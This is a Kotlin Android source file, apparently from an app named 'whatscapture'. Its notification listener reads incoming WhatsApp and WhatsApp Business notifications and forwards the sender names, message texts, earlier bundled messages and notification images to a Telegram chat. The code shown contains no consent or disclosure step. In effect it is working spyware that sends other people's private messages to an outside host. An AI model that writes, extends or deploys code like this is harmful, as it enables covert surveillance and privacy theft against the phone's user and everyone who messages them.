package com.whatscapture

import android.app.Notification
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class NotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (sbn.packageName != WHATSAPP_PACKAGE && sbn.packageName != WHATSAPP_BUSINESS_PACKAGE) return

        val extras: Bundle = sbn.notification.extras ?: return

        val title = extras.getString(EXTRA_TITLE, "")
        val text = extras.getString(EXTRA_TEXT, "")
        val summary = extras.getString(EXTRA_SUMMARY_TEXT, "")
        val bigText = extras.getString(EXTRA_BIG_TEXT, "")

        val messageText = when {
            bigText.isNotEmpty() -> bigText
            summary.isNotEmpty() -> summary
            text.isNotEmpty() -> text
            else -> return
        }

        val sender = if (title.isNotEmpty()) title else "Desconocido"

        val finalMsg = """
            📩 *WhatsApp - $sender*
            $messageText
        """.trimIndent()

        CoroutineScope(Dispatchers.IO).launch {
            TelegramSender.sendMessage(
                token = Config.getToken(this@NotificationListener),
                chatId = Config.getChatId(this@NotificationListener),
                text = finalMsg
            )
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                val largeIcon = sbn.notification.largeIcon
                if (largeIcon != null) {
                    CoroutineScope(Dispatchers.IO).launch {
                        TelegramSender.sendPhoto(
                            token = Config.getToken(this@NotificationListener),
                            chatId = Config.getChatId(this@NotificationListener),
                            bitmap = largeIcon,
                            caption = "Imagen de notificación - $sender"
                        )
                    }
                }
            }

            val bundledMessages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
            val messagingMessages = Notification.MessagingStyle.Message
                .getMessagesFromBundleArray(bundledMessages)

            for (msg in messagingMessages) {
                val text = msg.text
                if (text != null && text.toString() != messageText) {
                    CoroutineScope(Dispatchers.IO).launch {
                        TelegramSender.sendMessage(
                            token = Config.getToken(this@NotificationListener),
                            chatId = Config.getChatId(this@NotificationListener),
                            text = "📩 *WhatsApp - $sender*\n${text}"
                        )
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error al procesar notificación multimedia", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    companion object {
        private const val TAG = "NotificationListener"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
        private const val EXTRA_TITLE = "android.title"
        private const val EXTRA_TEXT = "android.text"
        private const val EXTRA_SUMMARY_TEXT = "android.summaryText"
        private const val EXTRA_BIG_TEXT = "android.bigText"
    }
}
